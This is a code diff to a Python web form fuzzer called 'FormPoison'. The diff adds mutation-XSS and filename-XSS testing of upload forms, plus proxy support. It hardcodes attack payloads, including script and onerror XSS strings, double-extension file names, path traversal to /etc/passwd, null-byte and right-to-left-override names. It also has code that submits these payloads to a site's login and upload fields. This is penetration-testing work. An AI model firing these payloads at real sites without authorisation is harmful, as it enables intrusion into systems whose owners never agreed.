@@ -23,6 +23,7 @@ import subprocess
 import os
 import tempfile
 from pathlib import Path
+import html
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -798,8 +799,8 @@ async def scan_website(url, headers, content):
 
     return results
 
-async def scan(url):
-    headers = {'User-Agent': 'Mozilla/5.0'}
+async def scan(url, proxies=None):
+    headers = {'User-Agent': 'FormPoison 1.0.'}
     try:
         ssl_context = ssl.create_default_context()
         async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
@@ -954,9 +955,12 @@ async def get_page_content(url, user_agent, proxies=None, ssl_cert=None, ssl_key
         console.print(f"[bold red]Error fetching page: {e}[/bold red]")
         return None
 
-def get_page_content_with_selenium(url):
+def get_page_content_with_selenium(url, proxies=None):
     options = webdriver.ChromeOptions()
     options.add_argument('--headless')
+    if proxies:
+        proxy_url = proxies.get('http')
+        options.add_argument(f'--proxy-server={proxy_url}')
     driver = webdriver.Chrome(options=options)
     driver.get(url)
     time.sleep(3)
@@ -1150,7 +1154,7 @@ def analyze_response(content, headers, payload_category, payload, verbose_all=Fa
                 libs_info.append(lib_name)
         vulnerabilities.append(f"Libraries Detected: {', '.join(libs_info)}")
 
-    # ZOPTYMALIZOWANA WERYFIKACJA Z WYSOKĄ PEWNOŚCIĄ
+    # high confidence providing
     payload_executed = False
     execution_confidence = "LOW"
     
@@ -1158,7 +1162,7 @@ def analyze_response(content, headers, payload_category, payload, verbose_all=Fa
         if is_sql_injection_successful(content, payload):
             payload_executed = True
             execution_confidence = "HIGH"
-            # Sprawdź dodatkowe potwierdzenia
+            # additional checks
             if any(error in content.lower() for error in ["syntax error", "mysql", "postgresql", "ora-"]):
                 execution_confidence = "VERY_HIGH"
                 
@@ -1170,7 +1174,7 @@ def analyze_response(content, headers, payload_category, payload, verbose_all=Fa
         if is_xss_executed(content, payload):
             payload_executed = True
             execution_confidence = "HIGH"
-            # Sprawdź dodatkowe potwierdzenia
+            # additional checks
             if any(evidence in content.lower() for evidence in ["<script>", "onerror=", "onload=", "javascript:"]):
                 execution_confidence = "VERY_HIGH"
                 
@@ -1181,7 +1185,27 @@ def analyze_response(content, headers, payload_category, payload, verbose_all=Fa
     if verbose_all:
         console.print(f"[bold yellow]Full response analysis:[/bold yellow]")
         console.print(f"[yellow]Payload executed: {payload_executed} ({execution_confidence} confidence)[/yellow]")
-        console.print(f"[yellow]{vulnerabilities}[/yellow]")
+        
+        # show more info
+        console.print(f"[yellow]Response headers:[/yellow]")
+        for header, value in headers.items():
+            console.print(f"[yellow]  {header}: {value}[/yellow]")
+        
+        # check if payload is in the response
+        if payload in content:
+            console.print(f"[bold red]🚨 PAYLOAD FOUND IN RESPONSE![/bold red]")
+            console.print(f"[red]Payload: {payload}[/red]")
+            console.print(f"[red]Payload category: {payload_category}[/red]")
+            
+            # show context 
+            payload_index = content.find(payload)
+            if payload_index != -1:
+                start = max(0, payload_index - 50)
+                end = min(len(content), payload_index + len(payload) + 50)
+                context = content[start:end]
+                console.print(f"[red]Payload context: ...{context}...[/red]")
+        
+        console.print(f"[yellow]Vulnerabilities detected: {vulnerabilities}[/yellow]")
 
     return vulnerabilities
 
@@ -1196,7 +1220,7 @@ async def test_input_field(url, payloads, threat_type, cookies, user_agents, inp
     table.add_column("Response Code", justify="right", style="magenta")
     table.add_column("Vulnerability Detected", style="bold green")
 
-    # Pobierz wszystkie pola formularza
+    # get all fields
     initial_user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
     content = await get_page_content(url, initial_user_agent, proxies, ssl_cert, ssl_key, ssl_verify)
     soup = BeautifulSoup(content, 'html.parser')
@@ -1204,7 +1228,7 @@ async def test_input_field(url, payloads, threat_type, cookies, user_agents, inp
 
     async def test_payload(payload):
         try:
-            # LOSOWY USER AGENT DLA KAŻDEGO PAYLOADU
+            # shuffle agent 
             current_user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
             headers = {'User-Agent': sanitize_user_agent(current_user_agent)}
             data = {}
@@ -1270,8 +1294,9 @@ async def test_input_field(url, payloads, threat_type, cookies, user_agents, inp
                     console.print(f"[bold blue]Response code: {status_code}[/bold blue]")
                     console.print(f"[bold blue]Possible Vulnerabilities/Issues: {', '.join(vulnerabilities)}[/bold blue]")
                     if verbose_all:
-                        console.print(f"[bold yellow]Response content:[/bold yellow]")
-                        console.print(f"[yellow]{content}[/yellow]")
+                        console.print(f"[bold yellow]Response length:{len(content)} characters[/bold yellow]")
+                        if payload['inputField'] in content:
+                            console.print(f"[bold red]🚨 PAYLOAD FOUND IN RESPONSE![/bold red]")
         except Exception as e:
             current_user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
             table.add_row(payload['inputField'], current_user_agent[:50] + "..." if len(current_user_agent) > 50 else current_user_agent, "Error", f"Request Failed: {str(e)}")
@@ -1330,7 +1355,7 @@ async def test_login_input_fields(url, payloads, cookies, user_agents, input_fie
     
     # skip checkbox, radio, hidden etc.
     input_fields = soup.find_all('input', {
-        'type': ['text', 'password', 'email', 'search', 'tel', 'url']  # only text fields
+        'type': ['text', 'password', 'email', 'search', 'tel', 'url', 'query']  # only text fields
     })
     
     filtered_input_fields = []
@@ -1422,8 +1447,9 @@ async def test_login_input_fields(url, payloads, cookies, user_agents, input_fie
                                 console.print(f"[bold blue]Response code: {status_code}[/bold blue]")
                                 console.print(f"[bold blue]Vulnerabilities detected: {', '.join(vulnerabilities)}[/bold blue]")
                                 if verbose_all:
-                                    console.print(f"[bold yellow]Response content:[/bold yellow]")
-                                    console.print(f"[yellow]{content}[/yellow]")
+                                    console.print(f"[bold yellow]Response length: {len(content)} characters[/bold yellow]")
+                                    if payload['inputField'] in content:
+                                        console.print(f"[bold red]🚨 PAYLOAD FOUND IN RESPONSE![/bold red]")
                 except Exception as e:
                     current_user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                     results.append({
@@ -1525,6 +1551,326 @@ async def test_all_forms(url, payloads, threat_type, cookies, user_agents, metho
         for input_field in inputs:
             console.print(f"[bold cyan]Testing input field: {input_field.get('name', 'input_field')}[/bold cyan]")
             await test_input_field(url, payloads, threat_type, cookies, user_agents, input_field, method, proxies, ssl_cert, ssl_key, ssl_verify, verbose, verbose_all, filter, secs)
+async def test_mutation_xss(url, input_fields, cookies, user_agents, method="POST", proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False, verbose=False, verbose_all=False, secs=0, payload_filters=None):
+    results = []
+    
+    if verbose:
+        console.print(f"[bold yellow]Done. Starting mXSS test...[/bold yellow]")
+        console.print(f"[yellow]URL: {url}[/yellow]")
+        console.print(f"[yellow]Fields: {len(input_fields)}[/yellow]")
+        for i, field in enumerate(input_fields):
+            field_name = field.get('name') or field.get('id') or f'field_{i}'
+            field_type = field.get('type', 'textarea' if field.name == 'textarea' else 'input')
+            console.print(f"[dim]  {i+1}. {field_name} ({field_type})[/dim]")
+
+    # .json fetch with filtering
+    mXSS_payloads = []
+    try:
+        with open("payloads.json", "r") as f:
+            all_payloads = json.load(f)
+        
+        # get only mutation
+        mXSS_keywords = ['<img', '<svg', '<math', '<table', '<form', '<select', '<details', 
+                        '<video', '<audio', '<body', 'onerror', 'onload', 'javascript:', 
+                        '<style', '<script', 'background=', 'poster=']
+        
+        for payload in all_payloads:
+            payload_text = payload.get('inputField', '')
+            if any(keyword in payload_text.lower() for keyword in mXSS_keywords):
+                mXSS_payloads.append({
+                    "inputField": payload_text,
+                    "category": f"mXSS_{payload.get('category', 'GENERIC')}"
+                })
+        
+        if payload_filters:
+            filter_patterns = [pattern.strip().lower() for pattern in payload_filters.split(",")]
+            filtered_payloads = []
+            for payload in mXSS_payloads:
+                payload_text = payload.get('inputField', '').lower()
+                if any(pattern in payload_text for pattern in filter_patterns):
+                    filtered_payloads.append(payload)
+            mXSS_payloads = filtered_payloads
+            if verbose:
+                console.print(f"[yellow]Applied payload filters: {payload_filters}[/yellow]")
+                console.print(f"[yellow]Filtered mXSS payloads: {len(mXSS_payloads)}[/yellow]")
+        else:
+            if verbose:
+                console.print(f"[yellow]Loaded mXSS payloads: {len(mXSS_payloads)}[/yellow]")
+            
+    except Exception as e:
+        if verbose:
+            console.print(f"[red]Error loading payloads: {str(e)}[/red]")
+        return results
+
+    table = Table(title=f"mXSS Results")
+    table.add_column("Field", style="cyan")
+    table.add_column("Payload", style="magenta") 
+    table.add_column("Status", style="green")
+    table.add_column("Vulnerability", style="red")
+
+    tested_count = 0
+    
+    async def test_payload(input_field, payload):
+        nonlocal tested_count
+        tested_count += 1
+        
+        field_name = input_field.get('name') or input_field.get('id') or 'unknown_field'
+        
+        if verbose:
+            console.print(f"[cyan][{tested_count}] Testing: {field_name} → {payload['category']}[/cyan]")
+        
+        try:
+            current_user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0"
+            headers = {'User-Agent': current_user_agent}
+            data = {}
+
+            field_name_key = input_field.get('name') or 'input_field'
+            data[field_name_key] = payload['inputField']
+
+            for field in input_fields:
+                other_field_name = field.get('name') or 'input_field'
+                if other_field_name != field_name_key:
+                    field_type = field.get('type', 'text')
+                    if field_type == 'email':
+                        data[other_field_name] = 'test@example.com'
+                    elif field_type == 'password':
+                        data[other_field_name] = 'password123'
+                    elif other_field_name.lower() in ['username', 'user', 'login']:
+                        data[other_field_name] = 'testuser'
+                    elif field.name == 'textarea':
+                        data[other_field_name] = 'test content'
+                    else:
+                        data[other_field_name] = 'test'
+
+            if verbose_all:
+                console.print(f"[dim]Sending data: {data}[/dim]")
+
+            ssl_context = ssl.create_default_context()
+            if ssl_cert and ssl_key:
+                ssl_context.load_cert_chain(ssl_cert, ssl_key)
+
+            cookie_jar = aiohttp.CookieJar()
+            for key, value in cookies.items():
+                cookie_jar.update_cookies({key: value})
+
+            async with aiohttp.ClientSession(cookie_jar=cookie_jar, connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
+                if method.upper() == "GET":
+                    response = await session.get(url, params=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify)
+                else:
+                    response = await session.post(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify)
+                
+                content = await response.text()
+                status_code = response.status
+
+                if verbose:
+                    console.print(f"[dim]Status: {status_code}, Length: {len(content)}[/dim]")
+
+                vulnerabilities = analyze_mutation_xss_response(content, payload['inputField'])
+
+                result = {
+                    "input_field": field_name,
+                    "payload": payload['inputField'],
+                    "category": payload['category'],
+                    "status_code": status_code,
+                    "vulnerabilities": vulnerabilities
+                }
+                results.append(result)
+
+                if vulnerabilities:
+                    table.add_row(
+                        field_name,
+                        payload['category'],
+                        str(status_code),
+                        " → ".join(vulnerabilities)
+                    )
+                    if verbose:
+                        console.print(f"[bold red]VULNERABLE: {field_name} → {payload['category']} → {', '.join(vulnerabilities)}[/bold red]")
+
+        except Exception as e:
+            if verbose:
+                console.print(f"[red]ERROR: {str(e)}[/red]")
+
+    total_tests = len(input_fields) * len(mXSS_payloads)
+    
+    if verbose:
+        console.print(f"[green]Executing {total_tests} mXSS tests...[/green]")
+    
+    for i, input_field in enumerate(input_fields):
+        for j, payload in enumerate(mXSS_payloads):
+            await test_payload(input_field, payload)
+            
+            if secs > 0:
+                await asyncio.sleep(secs)
+
+    console.print(table)
+    
+    vulnerabilities_found = sum(1 for r in results if r.get('vulnerabilities') and len(r['vulnerabilities']) > 0)
+    if verbose:
+        console.print(f"[bold]Found {vulnerabilities_found} vulnerabilities[/bold]")
+
+    with open("mXSS_results.json", "w") as f:
+        json.dump(results, f, indent=2)
+    
+    return results
+
+def analyze_mutation_xss_response(content, payload):
+    vulnerabilities = []
+    
+    if 'alert(1)' in content:
+        if '<script>' in content and 'alert(1)' in content:
+            vulnerabilities.append("SCRIPT_EXEC")
+        if 'onerror' in content and 'alert(1)' in content:
+            vulnerabilities.append("ONERROR_EXEC") 
+        if 'onload' in content and 'alert(1)' in content:
+            vulnerabilities.append("ONLOAD_EXEC")
+        if 'javascript:' in content.lower() and 'alert(1)' in content:
+            vulnerabilities.append("JS_URL_EXEC")
+    
+    soup = BeautifulSoup(content, 'html.parser')
+    
+    dangerous_elements = soup.find_all(['script', 'img', 'svg', 'math', 'body'])
+    for elem in dangerous_elements:
+        elem_str = str(elem)
+        if 'alert(1)' in elem_str:
+            vulnerabilities.append(f"MUTATED_{elem.name.upper()}")
+    
+    return vulnerabilities
+
+async def test_filename_xss(url, input_fields, cookies, user_agents, proxies=None, ssl_verify=False):
+    
+    filename_payloads = [
+        # Basic filename XSS
+        'test<img src=x onerror=alert(1)>.txt',
+        'file<script>alert(1)</script>.jpg',
+        'photo" onerror="alert(1).png',
+        
+        # Double extension attacks
+        'test.jpg.php',
+        'file.png.html',
+        'document.pdf.exe',
+        
+        # Path traversal + XSS
+        '../../../etc/passwd<img src=x onerror=alert(1)>',
+        '..\\..\\windows\\system32<img src=x>',
+        
+        # Special characters
+        'file%00.jpg',
+        'test%0a%0d.txt',
+        'photo\0.png',
+        
+        # Long filename attacks
+        'A' * 255 + '.jpg',
+        'test' + '../' * 50 + 'exploit.jpg',
+        
+        # Unicode and encoding
+        'file%C0%AE%C0%AE.jpg',  # UTF-8 
+        'photo%2e%2e%2f.jpg',    # URL enc
+        'test\u202eexe.jpg',     # right-to-left override
+    ]
+    
+    results = []
+    
+    for filename_payload in filename_payloads:
+        file_content = generate_random_file_content()
+        
+        for field in input_fields:
+            if field.get('type') == 'file' or 'file' in field.get('name', '').lower():
+                vulnerability = await test_single_filename_xss(
+                    url, field, filename_payload, file_content, cookies, user_agents, proxies, ssl_verify
+                )
+                if vulnerability:
+                    results.append({
+                        'field': field.get('name', 'unknown'),
+                        'filename': filename_payload,
+                        'vulnerability': vulnerability
+                    })
+    
+    return results
+
+def generate_random_file_content():
+#filling file with whatever 
+    
+    file_types = [
+        # JPEG
+        b'\xff\xd8\xff\xe0' + os.urandom(100),  # JPEG header + random data
+        
+        # PNG  
+        b'\x89PNG\r\n\x1a\n' + os.urandom(100),  # PNG header
+        
+        # PDF
+        b'%PDF-1.4\n' + os.urandom(100),  # PDF header
+        
+        # ZIP
+        b'PK\x03\x04' + os.urandom(100),  # ZIP header
+        
+        # Plain text
+        b'This is a test file for security testing.\n' + os.urandom(50),
+    ]
+    
+    return random.choice(file_types)
+
+async def test_single_filename_xss(url, field, filename, file_content, cookies, user_agents, proxies, ssl_verify):
+    
+    try:
+        current_user_agent = random.choice(user_agents)
+        headers = {
+            'User-Agent': sanitize_user_agent(current_user_agent),
+            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW'
+        }
+        
+        # multipart FormData
+        data = aiohttp.FormData()
+        data.add_field(field.get('name', 'file'), 
+                      file_content,
+                      filename=filename,
+                      content_type='application/octet-stream')
+        
+        # add more fields if they exist (expand it in future)
+        data.add_field('submit', 'Upload')
+        
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, data=data, cookies=cookies, headers=headers,
+                                  proxy=proxies.get('http') if proxies else None,
+                                  ssl=ssl_verify) as response:
+                
+                content = await response.text()
+                
+                # sucess detection
+                if detect_filename_xss_success(content, filename):
+                    return "CONFIRMED_FILENAME_XSS"
+                
+                # is reflected?
+                if filename in content:
+                    return "POTENTIAL_FILENAME_XSS"
+        
+        return None
+        
+    except Exception as e:
+        console.print(f"[red]Filename XSS test error: {e}[/red]")
+        return None
+
+def detect_filename_xss_success(content, filename):
+    
+    content_lower = content.lower()
+    filename_clean = re.sub(r'[^a-zA-Z0-9]', '', filename).lower()
+    
+    execution_indicators = [
+        r'<script[^>]*>.*?alert\(.*?</script>',
+        r'onerror\s*=\s*[\'\"][^\'\"]*alert\([^\'\"]*[\'\"]',
+        r'javascript:\s*alert\(1\)'
+    ]
+    
+    for indicator in execution_indicators:
+        if re.search(indicator, content_lower):
+            return True
+
+    if any(tag in content_lower for tag in ['<img', '<script', '<svg']):
+        for part in filename_clean.split():
+            if part in ['img', 'script', 'onerror', 'alert'] and part in content_lower:
+                return True
+    
+    return False
+
 async def main():
     console.clear()
     show_banner()
@@ -1541,6 +1887,7 @@ async def main():
     parser.add_argument("--ssl-cert", help="Path to SSL certificate file (e.g., cert.pem)")
     parser.add_argument("--ssl-key", help="Path to SSL private key file (e.g., key.pem)")
     parser.add_argument("--ssl-verify", action="store_true", help="Verify SSL certificate (default: False)")
+    parser.add_argument("--mXSS", action="store_true", help="Test Mutation XSS vulnerabilities")
     parser.add_argument("--method", default="POST", choices=["GET", "POST", "PUT", "DELETE"], help="HTTP method to use (default: POST)")
     parser.add_argument("--filter", help="Filter payloads by user-defined patterns (e.g., '<meta>, <script>, onclick')")
     parser.add_argument("--login", action="store_true", help="Enable login testing for login and password fields")
@@ -1548,6 +1895,7 @@ async def main():
     parser.add_argument("--verbose-all", action="store_true", help="Enable verbose mode with response content")
     parser.add_argument("--fieldname", help="Specific input field name to test (e.g., 'username')")
     parser.add_argument("-s", "--seconds", type=float, default=0, help="Delay between requests in seconds")
+    parser.add_argument("--filemode", action="store_true", help="Test filename XSS in file upload forms")
 
     if len(sys.argv) == 1:
         console.print("[bold red]Enter valid command[/bold red]")
@@ -1686,9 +2034,76 @@ async def main():
 
     input_fields = get_string_input_fields(page_content)
     console.print(f"[bold green]{len(input_fields)} String input fields found[/bold green]")
+    ##news
+
+    if args.filemode:
+        console.print("[bold blue]📁 Testing Filename XSS in upload forms...[/bold blue]")
+    
+        filemode_results = await test_filename_xss(
+            args.url, input_fields, cookies, user_agents, proxies, args.ssl_verify
+        )
+    
+    
+        for result in filemode_results:
+            console.print(f"[red]FILENAME XSS: {result['field']} → {result['filename']} → {result['vulnerability']}[/red]")
+    
 
     random.shuffle(user_agents)
+    if args.mXSS:
+        console.print("[bold blue]🧬 Testing Mutation XSS vulnerabilities...[/bold blue]")
+        
+        # --login
+        fields_to_test = input_fields
+        if args.login:
+            login_field = None
+            password_field = None
+            
+            
+            for field in input_fields:
+                name = field.get('name', '').lower()
+                id_ = field.get('id', '').lower()
+                placeholder = field.get('placeholder', '').lower()
+                field_type = field.get('type', '').lower()
 
+                
+                login_keywords = ['login', 'username', 'user', 'email', 'e-mail', 'mail', 'userid', 'user_id', 'loginname', 'account', 'mat-input-1']
+                if any(keyword in name or keyword in id_ or keyword in placeholder for keyword in login_keywords):
+                    login_field = field
+                    console.print(f"[bold green]Found login field: name={name}, id={id_}, type={field_type}[/bold green]")
+
+                
+                password_keywords = ['password', 'pass', 'passwd', 'pwd', 'userpassword', 'user_pass']
+                if any(keyword in name or keyword in id_ or keyword in placeholder for keyword in password_keywords):
+                    if field_type == 'password':
+                        password_field = field
+                        console.print(f"[bold green]Found password field: name={name}, type={field_type}[/bold green]")
+
+            if login_field and password_field:
+                fields_to_test = [login_field, password_field]
+                console.print(f"[yellow]Login mode: Testing login field '{login_field.get('name', '')}' and password field '{password_field.get('name', '')}'[/yellow]")
+            else:
+                console.print(f"[yellow]Login mode: Could not find both login and password fields, testing all {len(input_fields)} fields[/yellow]")
+                fields_to_test = input_fields
+        
+        mXSS_results = await test_mutation_xss(
+            args.url, 
+            fields_to_test, 
+            cookies, 
+            user_agents, 
+            args.method, 
+            proxies,
+            args.ssl_cert, 
+            args.ssl_key, 
+            args.ssl_verify, 
+            args.verbose, 
+            args.verbose_all, 
+            args.seconds,
+            payload_filters=args.filter
+        )
+        
+        console.print("[bold green]mXSS testing completed.[/bold green]")
+    
+    
     if args.fieldname:
         field = find_field_by_name(input_fields, args.fieldname)
         if field:
